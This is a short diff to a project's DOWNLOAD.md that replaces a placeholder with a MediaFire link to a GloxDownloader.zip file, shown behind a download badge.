@@ -5,7 +5,7 @@ DOWNLOAD.md for glox downloader.
 
 ## 🔽 Download GloxDownloader
 
-<a href="[PASTE_MEDIAFIRE_LINK_HERE](https://www.mediafire.com/file/0a56dk143q4jcdd/GloxDownloader.zip/file)">
+<a href="https://www.mediafire.com/file/0a56dk143q4jcdd/GloxDownloader.zip/file">
   <img src="https://img.shields.io/badge/Download-GloxDownloader-0078D4?style=for-the-badge&logo=download&logoColor=white" alt="Download GloxDownloader">
 </a>
 
